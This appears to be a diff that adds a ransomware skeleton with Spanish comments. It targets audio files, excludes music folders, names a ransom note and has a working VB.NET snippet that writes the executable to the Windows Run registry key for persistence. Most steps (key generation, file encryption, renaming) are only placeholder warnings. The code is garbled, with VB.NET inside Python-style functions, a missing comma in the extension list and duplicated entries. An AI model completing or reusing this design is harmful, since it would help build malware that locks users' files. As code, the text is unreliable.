@@ -1,0 +1,95 @@
+-------------------------------------
+| Configuración interna
+-------------------------------------
+
+CONFIG = {
+	"target_extensiones": [
+		".mp3", ".WAV", ".AIFF", ".FLAC", ".ALAC", ".APE", ".OGG", ".WMA", ".OPUS",".M4A", ".acc", ".amr" ".au", ".snd", ".mid", ".midi", ".ra", ".rm", ".3gp", ".caf"
+	],
+	"excluded_paths": [
+		"C:\Users\[NombreDeUsuario]\Music",
+		"C:\Users\[NombreDeUsuario]\Albums",
+		"C:\Users\[NombreDeUsuario]\Artist",
+		"C:\Users\[NombreDeUsuario]\New_releases",
+		"/Users/[NombreDeUsuario]/Music",
+		"/Users/[NombreDeUsuario]/Albums",
+		"/Users/[NombreDeUsuario]/Artist",
+		"/Users/[NombreDeUsuario]/New_releases",
+		"/home/[NombreDeUsuario]/Music",
+		"/home/[NombreDeUsuario]/Artist",
+		"/home/[NombreDeUsuario]/Artist",
+		"/storage/emulated/0/Music",
+		"/storage/emulated/0/Artist",
+		"/storage/emulated/0/New_releases",
+	],
+	"note_name": "Zabójca Starych Dam",
+	"marker": "start tidal://"
+}
+
+-------------------------------------
+| Validación del entorno
+-------------------------------------
+
+def check_enviroment():
+	Imports Microsoft.Win32
+
+	Module StartupModule
+		Sub SetStartup(ByVal enable As Boolean)
+			' Abrir la llave del registro para el usuario actual
+			Dim rk As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+
+			If enable Then
+				' "MiAppVB" es el nombre que verá el sistema
+				' Application.ExecutablePath obtiene la ruta del .exe actual
+				rk.SetValue("MiAppVB", Application.ExecutablePath)
+			Else
+				' Eliminar la entrada si el usuario decide desactivarlo
+				rk.DeleteValue("MiAppVB", False)
+			End If
+		End Sub
+	End Module
+
+-------------------------------------
+| Persistencia
+-------------------------------------
+
+def establish_persistence():
+	<warning:modificar_inicio_automatico>
+	<warning:copiarse_a_ruta_persistente>
+	<warning:crear_tarea_programada>
+
+-------------------------------------
+| Descubrimiento de archivos y rutas
+-------------------------------------
+
+def discover_files(base_path):
+	files_found = []
+	for item in <warning:recorrer_directorios>:
+		if <warning:extension_objetivo> and not <warning:ruta_excluida>:
+			files_found.append(item)
+	return files_found
+
+-------------------------------------
+| Preparación criptográfica
+-------------------------------------
+def setup_crypto():
+	<warning:generar_clave>
+	<warning:proteger_clave>
+	<warning:almacenar_o_transmitir_material_criptografico>
+
+-------------------------------------
+| Encriptación
+-------------------------------------
+def process_file(file_path, crypto_context):
+	data = <warning:leer_archivo>
+	tranformed_data = <warning:aplicar_transformacion_criptografia>
+	<warning:sobrescribir_o_guardar_nueva_version>
+	<warning:renombrar_archivo_en_disco>
+
+-------------------------------------
+| Manejo de nombres y extensiones
+-------------------------------------
+
+def rename_artifact(file_path):
+	new_name = file_path + "<warning:nueva_extension>"
+	<warning:renombrar_archivo_en_disco>
